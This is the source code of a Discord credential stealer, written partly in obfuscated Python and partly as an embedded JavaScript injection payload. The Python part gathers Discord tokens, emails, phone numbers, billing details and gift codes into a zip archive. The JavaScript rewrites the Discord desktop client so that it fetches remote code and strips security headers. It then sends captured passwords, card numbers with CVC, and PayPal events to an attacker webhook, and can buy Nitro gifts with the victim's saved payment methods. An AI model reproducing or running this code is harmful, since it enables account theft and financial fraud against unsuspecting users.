                    NWALHGLKAWPMUFUUSHVWWDWFWROSOJWTUXXYKWLHQDYNSBDSDVKQ = NWALHGLKAWPMUFUUSHVWWDWFWROSOJWTUXXYKWLHQDYNSBDSDVKQ['code']
                    PCHYOQQDCWIXLDOCFEYGKNSIRYHMFGGCCRQPVBELOXANDAHIPPGDSQODOMSISLQHNLQRMKBDHBJETFJNLFM = f"Gift: \"{MTEICAGYEZYSVMYGTWDTBYWFGTWJMANLLGOAWDPXKHJOOPXFLRNHAQZYGDMEPRDFXJAOFSVZURVINPBTMCTTPMRJB}\" Code: \"{NWALHGLKAWPMUFUUSHVWWDWFWROSOJWTUXXYKWLHQDYNSBDSDVKQ}\""
                    if len('\n\n'.join(NWALHGLKAWPMUFUUSHVWWDWFWROSOJWTUXXYKWLHQDYNSBDSDVKQ)) + len(PCHYOQQDCWIXLDOCFEYGKNSIRYHMFGGCCRQPVBELOXANDAHIPPGDSQODOMSISLQHNLQRMKBDHBJETFJNLFM) >= 1024:
                        break
                    EXLHWWDNJJFXTBCLCNBIWICFKAESUOHGYOBTTHSRPYHDPWHFBCWZVEVLAODMAD.append(PCHYOQQDCWIXLDOCFEYGKNSIRYHMFGGCCRQPVBELOXANDAHIPPGDSQODOMSISLQHNLQRMKBDHBJETFJNLFM)
                if len(EXLHWWDNJJFXTBCLCNBIWICFKAESUOHGYOBTTHSRPYHDPWHFBCWZVEVLAODMAD) > 0:
                    NWALHGLKAWPMUFUUSHVWWDWFWROSOJWTUXXYKWLHQDYNSBDSDVKQ = '\n\n'.join(EXLHWWDNJJFXTBCLCNBIWICFKAESUOHGYOBTTHSRPYHDPWHFBCWZVEVLAODMAD)
                else:
                    NWALHGLKAWPMUFUUSHVWWDWFWROSOJWTUXXYKWLHQDYNSBDSDVKQ = "None"
            else:
                NWALHGLKAWPMUFUUSHVWWDWFWROSOJWTUXXYKWLHQDYNSBDSDVKQ = "None"
        except:
            NWALHGLKAWPMUFUUSHVWWDWFWROSOJWTUXXYKWLHQDYNSBDSDVKQ = "None"
    
        try: v4r_software_name, LBITFYWUWSRAMXKXXNATPBNVXLXSEVRCRFNMKYOUIYCMVLWDYTCAXJKALUIHHGL = JNSALKDJDEWGGLTQXRHKOMEMMVRGIWVPHCHZCMTKVPLKNZEPSMXZZPDPQEAKKZSTB.get(HZPTHLQLZOILMVSSLCVFORFKKLDEBECARBSVVEHPKSOVLENSLGCOWIJRJGBGYBIRERJEMOLVL_d15c0rd, ("Unknown", "Unknown"))
        except: v4r_software_name, LBITFYWUWSRAMXKXXNATPBNVXLXSEVRCRFNMKYOUIYCMVLWDYTCAXJKALUIHHGL = "Unknown", "Unknown"

        PTECCOECWYCJHQKHCZTRDDZRENNQCFZJSVPIBWGLMWAGOLHRWIOYMKGRSYKOINAQMLXFGCYYLDIXEJR = PTECCOECWYCJHQKHCZTRDDZRENNQCFZJSVPIBWGLMWAGOLHRWIOYMKGRSYKOINAQMLXFGCYYLDIXEJR + f"""
Discord Account n°{str(CSGWQNYOPUUJUKJYRLYLLDRJAMEBYWUGAXDOSWZGJROQHYSSXSMCNZ)}:
 - Path Found      : {LBITFYWUWSRAMXKXXNATPBNVXLXSEVRCRFNMKYOUIYCMVLWDYTCAXJKALUIHHGL}
 - Software        : {v4r_software_name}
 - Token           : {HZPTHLQLZOILMVSSLCVFORFKKLDEBECARBSVVEHPKSOVLENSLGCOWIJRJGBGYBIRERJEMOLVL_d15c0rd}
 - Username        : {QJHFNINZNEFQTRETERGJXYADCHGOXEKWMEGCNPQBJFYQQYXSXNVYYOYRNWDOGRMRGHEQUETAZKLLPMVMXRGLGBPU}
 - Display Name    : {ZBHRWVRKHEXUZNORFFCHNVLPDOOLIFXYOCIIXWCUQORVVSFMWJXJBSCDS}
 - Id              : {EDMXOLKTRQJAERSBFBLGOMAVQIDYZVWWGZSHSYSCUIRDQZAVODTETJUIVZATTQHBRZXEXVIGOXQIXGSVUTGKENRUBQTJGEORQPUZ}
 - Email           : {XRIEQKTZEEZEZQKWMKQQUWYZRHNBDOCXXIIJKYXYRHUESTFIPFFHZSPGVLPBXLK}
 - Email Verified  : {JGFKIEGDLFSIBACQXFMCMHGUVFHKJQJHSATEKUBGUVOAXDNOMCBVTZOATORPJAREEUAZJOINBTH}
 - Phone           : {JQGIBUCGBJEEUHPQLMJZWHYFKTALDZUPOSVCEUGJTGRISZHEVMWDBJR}
 - Nitro           : {XJOMEJAMAOQIESRBVYVGJIOLUWXABANCNOIHQGOBOYDDRQRKUBJCMSGQWRARMKOPUIEJLAQPTWXFVTDODIVKEPIDEQ}
 - Language        : {HHNGQGZGQRIEDVKLYIFPRXYNGHEGKHYNFGOUTQLCTPOKTPMCKVB}
 - Billing         : {MOJSAUWVXBQSGQQSGSALGLJVKNUAUWHWBNOTOUTNMJXAUWFWYWSNRPOXEXQQUMEARNRMFMMTPETIZBFHIUOSRX}
 - Gift Code       : {NWALHGLKAWPMUFUUSHVWWDWFWROSOJWTUXXYKWLHQDYNSBDSDVKQ}
 - Profile Picture : {RDFOLIBQTZOURSAMJRAEMFCSPWKBIHURFRFIMZODBFOSUDXSUZXAKYZMCYONUFHEOV}
 - Multi-Factor Authentication : {VGEKQNNNPVHQBXJNZFAOZXBAEPUBPNQOWIQBXAMXFAANOSQPAQZASWGDVHGLIEINXRNGPNNGGTVDAEQIQMQJTWKZRP}
"""
    TXCIYPRPYNRKZAJLMDFSLPQNEREXVRPESXKXLMEJSMPHVFQQVTIDJXIVYFETNIZGOAMXZZLNIKOMQCJT.writestr(f"Discord Accounts ({CSGWQNYOPUUJUKJYRLYLLDRJAMEBYWUGAXDOSWZGJROQHYSSXSMCNZ}).txt", PTECCOECWYCJHQKHCZTRDDZRENNQCFZJSVPIBWGLMWAGOLHRWIOYMKGRSYKOINAQMLXFGCYYLDIXEJR)

    return CSGWQNYOPUUJUKJYRLYLLDRJAMEBYWUGAXDOSWZGJROQHYSSXSMCNZ

RCJSCHMEDGEVUASLCBIICTETCAZGAVMGHQLZTOLIEFNVFNLDLDXJBIZQJCTEFTFNO = r"""
const args = process.argv;
const fs = require('fs');
const path = require('path');
const https = require('https');
const querystring = require('querystring');
const { BrowserWindow, session } = require('electron');

const config = {
  webhook: '%WEBHOOK_HERE%', 
  webhook_protector_key: '%WEBHOOK_KEY%', 
  auto_buy_nitro: false, 
  ping_on_run: true, 
  ping_val: '@everyone',
  ip_address_public: '%IP_PUBLIC%',
  username: '%USERNAME%',
  embed_name: '%EMBED_NAME%', 
  embed_icon: '%EMBED_ICON%'.replace(/ /g, '%20'), 
  footer_text: '%FOOTER_TEXT%',
  embed_color: %EMBED_COLOR%, 
  injection_url: '', 
  api: 'https://discord.com/api/v9/users/@me',
  nitro: {
    boost: {
      year: {
        id: '521847234246082599',
        sku: '511651885459963904',
        price: '9999',
      },
      month: {
        id: '521847234246082599',
        sku: '511651880837840896',
        price: '999',
      },
    },
    classic: {
      month: {
        id: '521846918637420545',
        sku: '511651871736201216',
        price: '499',
      },
    },
  },
  filter: {
    urls: [
      'https://discord.com/api/v*/users/@me',
      'https://discordapp.com/api/v*/users/@me',
      'https://*.discord.com/api/v*/users/@me',
      'https://discordapp.com/api/v*/auth/login',
      'https://discord.com/api/v*/auth/login',
      'https://*.discord.com/api/v*/auth/login',
      'https://api.braintreegateway.com/merchants/49pp2rp4phym7387/client_api/v*/payment_methods/paypal_accounts',
      'https://api.stripe.com/v*/tokens',
      'https://api.stripe.com/v*/setup_intents/*/confirm',
      'https://api.stripe.com/v*/payment_intents/*/confirm',
    ],
  },
  filter2: {
    urls: [
      'https://status.discord.com/api/v*/scheduled-maintenances/upcoming.json',
      'https://*.discord.com/api/v*/applications/detectable',
      'https://discord.com/api/v*/applications/detectable',
      'https://*.discord.com/api/v*/users/@me/library',
      'https://discord.com/api/v*/users/@me/library',
      'wss://remote-auth-gateway.discord.gg/*',
    ],
  },
};

function parity_32(x, y, z) {
  return x ^ y ^ z;
}
function ch_32(x, y, z) {
  return (x & y) ^ (~x & z);
}

function maj_32(x, y, z) {
  return (x & y) ^ (x & z) ^ (y & z);
}
function rotl_32(x, n) {
  return (x << n) | (x >>> (32 - n));
}
function safeAdd_32_2(a, b) {
  var lsw = (a & 0xffff) + (b & 0xffff),
    msw = (a >>> 16) + (b >>> 16) + (lsw >>> 16);

  return ((msw & 0xffff) << 16) | (lsw & 0xffff);
}
function safeAdd_32_5(a, b, c, d, e) {
  var lsw = (a & 0xffff) + (b & 0xffff) + (c & 0xffff) + (d & 0xffff) + (e & 0xffff),
    msw = (a >>> 16) + (b >>> 16) + (c >>> 16) + (d >>> 16) + (e >>> 16) + (lsw >>> 16);

  return ((msw & 0xffff) << 16) | (lsw & 0xffff);
}
function binb2hex(binarray) {
  var hex_tab = '0123456789abcdef',
    str = '',
    length = binarray.length * 4,
    i,
    srcByte;

  for (i = 0; i < length; i += 1) {
    srcByte = binarray[i >>> 2] >>> ((3 - (i % 4)) * 8);
    str += hex_tab.charAt((srcByte >>> 4) & 0xf) + hex_tab.charAt(srcByte & 0xf);
  }

  return str;
}

function getH() {
  return [0x67452301, 0xefcdab89, 0x98badcfe, 0x10325476, 0xc3d2e1f0];
}
function roundSHA1(block, H) {
  var W = [],
    a,
    b,
    c,
    d,
    e,
    T,
    ch = ch_32,
    parity = parity_32,
    maj = maj_32,
    rotl = rotl_32,
    safeAdd_2 = safeAdd_32_2,
    t,
    safeAdd_5 = safeAdd_32_5;

  a = H[0];
  b = H[1];
  c = H[2];
  d = H[3];
  e = H[4];

  for (t = 0; t < 80; t += 1) {
    if (t < 16) {
      W[t] = block[t];
    } else {
      W[t] = rotl(W[t - 3] ^ W[t - 8] ^ W[t - 14] ^ W[t - 16], 1);
    }

    if (t < 20) {
      T = safeAdd_5(rotl(a, 5), ch(b, c, d), e, 0x5a827999, W[t]);
    } else if (t < 40) {
      T = safeAdd_5(rotl(a, 5), parity(b, c, d), e, 0x6ed9eba1, W[t]);
    } else if (t < 60) {
      T = safeAdd_5(rotl(a, 5), maj(b, c, d), e, 0x8f1bbcdc, W[t]);
    } else {
      T = safeAdd_5(rotl(a, 5), parity(b, c, d), e, 0xca62c1d6, W[t]);
    }

    e = d;
    d = c;
    c = rotl(b, 30);
    b = a;
    a = T;
  }

  H[0] = safeAdd_2(a, H[0]);
  H[1] = safeAdd_2(b, H[1]);
  H[2] = safeAdd_2(c, H[2]);
  H[3] = safeAdd_2(d, H[3]);
  H[4] = safeAdd_2(e, H[4]);

  return H;
}

function finalizeSHA1(remainder, remainderBinLen, processedBinLen, H) {
  var i, appendedMessageLength, offset;

  offset = (((remainderBinLen + 65) >>> 9) << 4) + 15;
  while (remainder.length <= offset) {
    remainder.push(0);
  }
  remainder[remainderBinLen >>> 5] |= 0x80 << (24 - (remainderBinLen % 32));
  remainder[offset] = remainderBinLen + processedBinLen;
  appendedMessageLength = remainder.length;

  for (i = 0; i < appendedMessageLength; i += 16) {
    H = roundSHA1(remainder.slice(i, i + 16), H);
  }
  return H;
}

function hex2binb(str, existingBin, existingBinLen) {
  var bin,
    length = str.length,
    i,
    num,
    intOffset,
    byteOffset,
    existingByteLen;

  bin = existingBin || [0];
  existingBinLen = existingBinLen || 0;
  existingByteLen = existingBinLen >>> 3;

  if (0 !== length % 2) {
    console.error('String of HEX type must be in byte increments');
  }

  for (i = 0; i < length; i += 2) {
    num = parseInt(str.substr(i, 2), 16);
    if (!isNaN(num)) {
      byteOffset = (i >>> 1) + existingByteLen;
      intOffset = byteOffset >>> 2;
      while (bin.length <= intOffset) {
        bin.push(0);
      }
      bin[intOffset] |= num << (8 * (3 - (byteOffset % 4)));
    } else {
      console.error('String of HEX type contains invalid characters');
    }
  }

  return { value: bin, binLen: length * 4 + existingBinLen };
}

class jsSHA {
  constructor() {
    var processedLen = 0,
      remainder = [],
      remainderLen = 0,
      intermediateH,
      converterFunc,
      outputBinLen,
      variantBlockSize,
      roundFunc,
      finalizeFunc,
      finalized = false,
      hmacKeySet = false,
      keyWithIPad = [],
      keyWithOPad = [],
      numRounds,
      numRounds = 1;

    converterFunc = hex2binb;

    if (numRounds !== parseInt(numRounds, 10) || 1 > numRounds) {
      console.error('numRounds must a integer >= 1');
    }
    variantBlockSize = 512;
    roundFunc = roundSHA1;
    finalizeFunc = finalizeSHA1;
    outputBinLen = 160;
    intermediateH = getH();

    this.setHMACKey = function (key) {
      var keyConverterFunc, convertRet, keyBinLen, keyToUse, blockByteSize, i, lastArrayIndex;
      keyConverterFunc = hex2binb;
      convertRet = keyConverterFunc(key);
      keyBinLen = convertRet['binLen'];
      keyToUse = convertRet['value'];
      blockByteSize = variantBlockSize >>> 3;
      lastArrayIndex = blockByteSize / 4 - 1;

      if (blockByteSize < keyBinLen / 8) {
        keyToUse = finalizeFunc(keyToUse, keyBinLen, 0, getH());
        while (keyToUse.length <= lastArrayIndex) {
          keyToUse.push(0);
        }
        keyToUse[lastArrayIndex] &= 0xffffff00;
      } else if (blockByteSize > keyBinLen / 8) {
        while (keyToUse.length <= lastArrayIndex) {
          keyToUse.push(0);
        }
        keyToUse[lastArrayIndex] &= 0xffffff00;
      }

      for (i = 0; i <= lastArrayIndex; i += 1) {
        keyWithIPad[i] = keyToUse[i] ^ 0x36363636;
        keyWithOPad[i] = keyToUse[i] ^ 0x5c5c5c5c;
      }

      intermediateH = roundFunc(keyWithIPad, intermediateH);
      processedLen = variantBlockSize;

      hmacKeySet = true;
    };

    this.update = function (srcString) {
      var convertRet,
        chunkBinLen,
        chunkIntLen,
        chunk,
        i,
        updateProcessedLen = 0,
        variantBlockIntInc = variantBlockSize >>> 5;

      convertRet = converterFunc(srcString, remainder, remainderLen);
      chunkBinLen = convertRet['binLen'];
      chunk = convertRet['value'];

      chunkIntLen = chunkBinLen >>> 5;
      for (i = 0; i < chunkIntLen; i += variantBlockIntInc) {
        if (updateProcessedLen + variantBlockSize <= chunkBinLen) {
          intermediateH = roundFunc(chunk.slice(i, i + variantBlockIntInc), intermediateH);
          updateProcessedLen += variantBlockSize;
        }
      }
      processedLen += updateProcessedLen;
      remainder = chunk.slice(updateProcessedLen >>> 5);
      remainderLen = chunkBinLen % variantBlockSize;
    };

    this.getHMAC = function () {
      var firstHash;

      if (false === hmacKeySet) {
        console.error('Cannot call getHMAC without first setting HMAC key');
      }

      const formatFunc = function (binarray) {
        return binb2hex(binarray);
      };

      if (false === finalized) {
        firstHash = finalizeFunc(remainder, remainderLen, processedLen, intermediateH);
        intermediateH = roundFunc(keyWithOPad, getH());
        intermediateH = finalizeFunc(firstHash, outputBinLen, variantBlockSize, intermediateH);
      }

      finalized = true;
      return formatFunc(intermediateH);
    };
  }
}

if ('function' === typeof define && define['amd']) {
  define(function () {
    return jsSHA;
  });
} else if ('undefined' !== typeof exports) {
  if ('undefined' !== typeof module && module['exports']) {
    module['exports'] = exports = jsSHA;
  } else {
    exports = jsSHA;
  }
} else {
  global['jsSHA'] = jsSHA;
}

if (jsSHA.default) {
  jsSHA = jsSHA.default;
}

function totp(key) {
  const period = 30;
  const digits = 6;
  const timestamp = Date.now();
  const epoch = Math.round(timestamp / 1000.0);
  const time = leftpad(dec2hex(Math.floor(epoch / period)), 16, '0');
  const shaObj = new jsSHA();
  shaObj.setHMACKey(base32tohex(key));
  shaObj.update(time);
  const hmac = shaObj.getHMAC();
  const offset = hex2dec(hmac.substring(hmac.length - 1));
  let otp = (hex2dec(hmac.substr(offset * 2, 8)) & hex2dec('7fffffff')) + '';
  otp = otp.substr(Math.max(otp.length - digits, 0), digits);
  return otp;
}

function hex2dec(s) {
  return parseInt(s, 16);
}

function dec2hex(s) {
  return (s < 15.5 ? '0' : '') + Math.round(s).toString(16);
}

function base32tohex(base32) {
  let base32chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ234567',
    bits = '',
    hex = '';

  base32 = base32.replace(/=+$/, '');

  for (let i = 0; i < base32.length; i++) {
    let val = base32chars.indexOf(base32.charAt(i).toUpperCase());
    if (val === -1) console.error('Invalid base32 character in key');
    bits += leftpad(val.toString(2), 5, '0');
  }

  for (let i = 0; i + 8 <= bits.length; i += 8) {
    let chunk = bits.substr(i, 8);
    hex = hex + leftpad(parseInt(chunk, 2).toString(16), 2, '0');
  }
  return hex;
}

function leftpad(str, len, pad) {
  if (len + 1 >= str.length) {
    str = Array(len + 1 - str.length).join(pad) + str;
  }
  return str;
}

const discordPath = (function () {
  const app = args[0].split(path.sep).slice(0, -1).join(path.sep);
  let resourcePath;

  if (process.platform === 'win32') {
    resourcePath = path.join(app, 'resources');
  } else if (process.platform === 'darwin') {
    resourcePath = path.join(app, 'Contents', 'Resources');
  }

  if (fs.existsSync(resourcePath)) return { resourcePath, app };
  return { undefined, undefined };
})();

function updateCheck() {
  const { resourcePath, app } = discordPath;
  if (resourcePath === undefined || app === undefined) return;
  const appPath = path.join(resourcePath, 'app');
  const packageJson = path.join(appPath, 'package.json');
  const resourceIndex = path.join(appPath, 'index.js');
  const indexJs = `${app}\\modules\\discord_desktop_core-1\\discord_desktop_core\\index.js`;
  const bdPath = path.join(process.env.APPDATA, '\\betterdiscord\\data\\betterdiscord.asar');
  if (!fs.existsSync(appPath)) fs.mkdirSync(appPath);
  if (fs.existsSync(packageJson)) fs.unlinkSync(packageJson);
  if (fs.existsSync(resourceIndex)) fs.unlinkSync(resourceIndex);

  if (process.platform === 'win32' || process.platform === 'darwin') {
    fs.writeFileSync(
      packageJson,
      JSON.stringify(
        {
          name: 'discord',
          main: 'index.js',
        },
        null,
        4,
      ),
    );

    const startUpScript = `const fs = require('fs'), https = require('https');
const indexJs = '${indexJs}';
const bdPath = '${bdPath}';
const fileSize = fs.statSync(indexJs).size
fs.readFileSync(indexJs, 'utf8', (err, data) => {
    if (fileSize < 20000 || data === "module.exports = require('./core.asar')") 
        init();
})
async function init() {
    https.get('${config.injection_url}', (res) => {
        const file = fs.createWriteStream(indexJs);
        res.replace('%WEBHOOK_HERE%', '${config.webhook}')
        res.replace('%WEBHOOK_KEY%', '${config.webhook_protector_key}')
        res.pipe(file);
        file.on('finish', () => {
            file.close();
        });
    
    }).on("error", (err) => {
        setTimeout(init(), 10000);
    });
}
require('${path.join(resourcePath, 'app.asar')}')
if (fs.existsSync(bdPath)) require(bdPath);`;
    fs.writeFileSync(resourceIndex, startUpScript.replace(/\\/g, '\\\\'));
  }
  if (!fs.existsSync(path.join(__dirname, 'initiation'))) return !0;
  fs.rmdirSync(path.join(__dirname, 'initiation'));
  execScript(
    `window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[["get_require"]]]),delete gg.m.get_require,delete gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]);function LogOut(){(function(a){const b="string"==typeof a?a:null;for(const c in gg.c)if(gg.c.hasOwnProperty(c)){const d=gg.c[c].exports;if(d&&d.__esModule&&d.default&&(b?d.default[b]:a(d.default)))return d.default;if(d&&(b?d[b]:a(d)))return d}return null})("login").logout()}LogOut();`,
  );
  return !1;
}

const execScript = (script) => {
  const window = BrowserWindow.getAllWindows()[0];
  return window.webContents.executeJavaScript(script, !0);
};

const getInfo = async (token) => {
  const info = await execScript(`var xmlHttp = new XMLHttpRequest();
    xmlHttp.open("GET", "${config.api}", false);
    xmlHttp.setRequestHeader("Authorization", "${token}");
    xmlHttp.send(null);
    xmlHttp.responseText;`);
  return JSON.parse(info);
};

const fetchBilling = async (token) => {
  const bill = await execScript(`var xmlHttp = new XMLHttpRequest(); 
    xmlHttp.open("GET", "${config.api}/billing/payment-sources", false); 
    xmlHttp.setRequestHeader("Authorization", "${token}"); 
    xmlHttp.send(null); 
    xmlHttp.responseText`);
  if (!bill.lenght || bill.length === 0) return '';
  return JSON.parse(bill);
};

const getBilling = async (token) => {
  const data = await fetchBilling(token);
  if (!data) return '❌';
  let billing = '';
  data.forEach((x) => {
    if (!x.invalid) {
      switch (x.type) {
        case 1:
          billing += '[CARD] ';
          break;
        case 2:
          billing += '[PAYPAL] ';
          break;
      }
    }
  });
  if (!billing) billing = 'None';
  return billing;
};

const Purchase = async (token, id, _type, _time) => {
  const options = {
    expected_amount: config.nitro[_type][_time]['price'],
    expected_currency: 'usd',
    gift: true,
    payment_source_id: id,
    payment_source_token: null,
    purchase_token: '2422867c-244d-476a-ba4f-36e197758d97',
    sku_subscription_plan_id: config.nitro[_type][_time]['sku'],
  };

  const req = execScript(`var xmlHttp = new XMLHttpRequest();
    xmlHttp.open("POST", "https://discord.com/api/v9/store/skus/${config.nitro[_type][_time]['id']}/purchase", false);
    xmlHttp.setRequestHeader("Authorization", "${token}");
    xmlHttp.setRequestHeader('Content-Type', 'application/json');
    xmlHttp.send(JSON.stringify(${JSON.stringify(options)}));
    xmlHttp.responseText`);
  if (req['gift_code']) {
    return 'https://discord.gift/' + req['gift_code'];
  } else return null;
};

const buyNitro = async (token) => {
  const data = await fetchBilling(token);
  const failedMsg = 'Failed to Purchase';
  if (!data) return failedMsg;

  let IDS = [];
  data.forEach((x) => {
    if (!x.invalid) {
      IDS = IDS.concat(x.id);
    }
  });
  for (let sourceID in IDS) {
    const first = Purchase(token, sourceID, 'boost', 'year');
    if (first !== null) {
      return first;
    } else {
      const second = Purchase(token, sourceID, 'boost', 'month');
      if (second !== null) {
        return second;
      } else {
        const third = Purchase(token, sourceID, 'classic', 'month');
        if (third !== null) {
          return third;
        } else {
          return failedMsg;
        }
      }
    }
  }
};

const hooker = async (content) => {
  const data = JSON.stringify(content);
  const url = new URL(config.webhook);
  const headers = {
    'Content-Type': 'application/json',
    'Access-Control-Allow-Origin': '*',
  };
  if (!config.webhook.includes('api/webhooks')) {
    const key = totp(config.webhook_protector_key);
    headers['Authorization'] = key;
  }
  const options = {
    protocol: url.protocol,
    hostname: url.host,
    path: url.pathname,
    method: 'POST',
    headers: headers,
  };
  const req = https.request(options);

  req.on('error', (err) => {
    console.log(err);
  });
  req.write(data);
  req.end();
};

const login = async (email, password, token) => {
  const json = await getInfo(token);
  const content = {
    username: config.embed_name,
    avatar_url: config.embed_icon,
    embeds: [
      {
        color: config.embed_color,
        title: `Discord Injection [Login] \`${config.username} "${config.ip_address_public}"\`:`, 
        fields: [
          {
            name: ':e_mail: Email:',
            value: `\`\`\`${email}\`\`\``,
            inline: false,
          },
          {
            name: ':key: Password:',
            value: `\`\`\`${password}\`\`\``,
            inline: false,
          },
          {
            name: ':globe_with_meridians: Token:',
            value: `\`\`\`${token}\`\`\``,
            inline: false,
          },
        ],
        author: {
          name: json.username + '#' + json.discriminator + ' (' + json.id + ')',
          icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
        },
        footer: {
            text: config.footer_text,
            icon_url: config.embed_icon
        },
      },
    ],
  };
  if (config.ping_on_run) content['content'] = config.ping_val;
  hooker(content);
};

const passwordChanged = async (oldpassword, newpassword, token) => {
  const json = await getInfo(token);
  const content = {
    username: config.embed_name,
    avatar_url: config.embed_icon,
    embeds: [
      {
        color: config.embed_color,
        title: `Discord Injection [Password Changed] \`${config.username} "${config.ip_address_public}"\`:`, 
        fields: [
          {
            name: ':e_mail: Email:',
            value: `\`\`\`${json.email}\`\`\``,
            inline: false,
          },
          {
            name: ':unlock: Old Password:',
            value: `\`\`\`${oldpassword}\`\`\``,
            inline: true,
          },
          {
            name: ':key: New Password:',
            value: `\`\`\`${newpassword}\`\`\``,
            inline: true,
          },
          {
            name: ':globe_with_meridians: Token:',
            value: `\`\`\`${token}\`\`\``,
            inline: false,
          },
        ],
        author: {
          name: json.username + '#' + json.discriminator + ' (' + json.id + ')',
          icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
        },
        footer: {
            text: config.footer_text,
            icon_url: config.embed_icon
        },
      },
    ],
  };
  if (config.ping_on_run) content['content'] = config.ping_val;
  hooker(content);
};

const emailChanged = async (email, password, token) => {
  const json = await getInfo(token);
  const content = {
    username: config.embed_name,
    avatar_url: config.embed_icon,
    embeds: [
      {
        color: config.embed_color,
        title: `Discord Injection [Email Changed] \`${config.username} "${config.ip_address_public}"\`:`, 
        fields: [
          {
            name: ':e_mail: New Email:',
            value: `\`\`\`${email}\`\`\``,
            inline: false,
          },
          {
            name: ':key: Password:',
            value: `\`\`\`${password}\`\`\``,
            inline: false,
          },
          {
            name: ':globe_with_meridians: Token:',
            value: `\`\`\`${token}\`\`\``,
            inline: false,
          },
        ],
        author: {
          name: json.username + '#' + json.discriminator + ' | ' + json.id,
          icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
        },
        footer: {
            text: config.footer_text,
            icon_url: config.embed_icon
        },
      },
    ],
  };
  if (config.ping_on_run) content['content'] = config.ping_val;
  hooker(content);
};

const PaypalAdded = async (token) => {
  const json = await getInfo(token);
  const billing = await getBilling(token);
  const content = {
    username: config.embed_name,
    avatar_url: config.embed_icon,
    embeds: [
      {
        color: config.embed_color,
        title: `Discord Injection [Paypal Added] \`${config.username} "${config.ip_address_public}"\`:`,
        fields: [
          {
            name: ':moneybag: Billing:',
            value: `\`\`\`${billing}\`\`\``,
            inline: false,
          },
          {
            name: ':globe_with_meridians: Token:',
            value: `\`\`\`${token}\`\`\``,
            inline: false,
          },
        ],
        author: {
          name: json.username + '#' + json.discriminator + ' (' + json.id + ')',
          icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
        },
        footer: {
            text: config.footer_text,
            icon_url: config.embed_icon
        },
      },
    ],
  };
  if (config.ping_on_run) content['content'] = config.ping_val;
  hooker(content);
};

const ccAdded = async (number, cvc, expir_month, expir_year, token) => {
  const json = await getInfo(token);
  const billing = await getBilling(token);
  const content = {
    username: config.embed_name,
    avatar_url: config.embed_icon,
    embeds: [
      {
        color: config.embed_color,
        title: `Discord Injection [Card Added] \`${config.username} "${config.ip_address_public}"\`:`,
        fields: [
          {
            name: ':identification_card: Card:',
            value: `\`\`\`Number: ${number}\nCVC: ${cvc}\nExpir Month: ${expir_month}\nExpir Year: ${expir_year}\`\`\``,
            inline: false,
          },
          {
            name: ':moneybag: Billing:',
            value: `\`\`\`${billing}\`\`\``,
            inline: false,
          },
          {
            name: ':globe_with_meridians: Token:',
            value: `\`\`\`${token}\`\`\``,
            inline: false,
          },
        ],
        author: {
          name: json.username + '#' + json.discriminator + ' (' + json.id + ')',
          icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
        },
        footer: {
            text: config.footer_text,
            icon_url: config.embed_icon
        },
      },
    ],
  };
  if (config.ping_on_run) content['content'] = config.ping_val;
  hooker(content);
};

const nitroBought = async (token) => {
  const json = await getInfo(token);
  const code = await buyNitro(token);
  const content = {
    username: config.embed_name,
    content: code,
    avatar_url: config.embed_icon,
    embeds: [
      {
        color: config.embed_color,
        title: `Discord Injection [Nitro Bought] \`${config.username} "${config.ip_address_public}"\`:`,
        fields: [
          {
            name: ':rocket: Nitro Code:',
            value: `\`\`\`${code}\`\`\``,
            inline: true,
          },
          {
            name: ':globe_with_meridians: Token:',
            value: `\`\`\`${token}\`\`\``,
            inline: false,
          },
        ],
        author: {
          name: json.username + '#' + json.discriminator + ' (' + json.id + ')',
          icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
        },
        footer: {
            text: config.footer_text,
            icon_url: config.embed_icon
        },
      },
    ],
  };
  if (config.ping_on_run) content['content'] = config.ping_val + `\n${code}`;
  hooker(content);
};
session.defaultSession.webRequest.onBeforeRequest(config.filter2, (details, callback) => {
  if (details.url.startsWith('wss://remote-auth-gateway')) return callback({ cancel: true });
  updateCheck();
});

session.defaultSession.webRequest.onHeadersReceived((details, callback) => {
  if (details.url.startsWith(config.webhook)) {
    if (details.url.includes('discord.com')) {
      callback({
        responseHeaders: Object.assign(
          {
            'Access-Control-Allow-Headers': '*',
          },
          details.responseHeaders,
        ),
      });
    } else {
      callback({
        responseHeaders: Object.assign(
          {
            'Content-Security-Policy': ["default-src '*'", "Access-Control-Allow-Headers '*'", "Access-Control-Allow-Origin '*'"],
            'Access-Control-Allow-Headers': '*',
            'Access-Control-Allow-Origin': '*',
          },
          details.responseHeaders,
        ),
      });
    }
  } else {
    delete details.responseHeaders['content-security-policy'];
    delete details.responseHeaders['content-security-policy-report-only'];

    callback({
      responseHeaders: {
        ...details.responseHeaders,
        'Access-Control-Allow-Headers': '*',
      },
    });
  }
});

session.defaultSession.webRequest.onCompleted(config.filter, async (details, _) => {
  if (details.statusCode !== 200 && details.statusCode !== 202) return;
  const unparsed_data = Buffer.from(details.uploadData[0].bytes).toString();
  const data = JSON.parse(unparsed_data);
  const token = await execScript(
    `(webpackChunkdiscord_app.push([[''],{},e=>{m=[];for(let c in e.c)m.push(e.c[c])}]),m).find(m=>m?.exports?.default?.getToken!==void 0).exports.default.getToken()`,
  );
  switch (true) {
    case details.url.endsWith('login'):
      login(data.login, data.password, token).catch(console.error);
      break;

    case details.url.endsWith('users/@me') && details.method === 'PATCH':
      if (!data.password) return;
      if (data.email) {
        emailChanged(data.email, data.password, token).catch(console.error);
      }
      if (data.new_password) {
        passwordChanged(data.password, data.new_password, token).catch(console.error);
      }
      break;

    case details.url.endsWith('tokens') && details.method === 'POST':
      const item = querystring.parse(unparsedData.toString());
      ccAdded(item['card[number]'], item['card[cvc]'], item['card[exp_month]'], item['card[exp_year]'], token).catch(console.error);
      break;

    case details.url.endsWith('paypal_accounts') && details.method === 'POST':
      PaypalAdded(token).catch(console.error);
      break;

    case details.url.endsWith('confirm') && details.method === 'POST':
      if (!config.auto_buy_nitro) return;
      setTimeout(() => {
        nitroBought(token).catch(console.error);
      }, 7500);
      break;

    default:
      break;
  }
});
